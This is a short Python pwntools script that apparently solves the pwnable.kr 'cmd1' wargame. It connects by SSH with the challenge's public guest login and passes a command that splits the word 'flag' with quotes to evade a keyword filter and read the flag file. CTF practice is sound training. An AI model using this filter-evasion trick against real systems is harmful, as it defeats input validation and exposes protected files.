from pwn import *


def cmd1solve():
    s = ssh(host='pwnable.kr',
            port=2222,
            user='cmd1',
            password='guest')

    sh = s.process(['cmd1', '/bin/cat "f""lag"'])
    return sh.readline().replace('\n', '')


if __name__ == "__main__":
    print(cmd1solve())
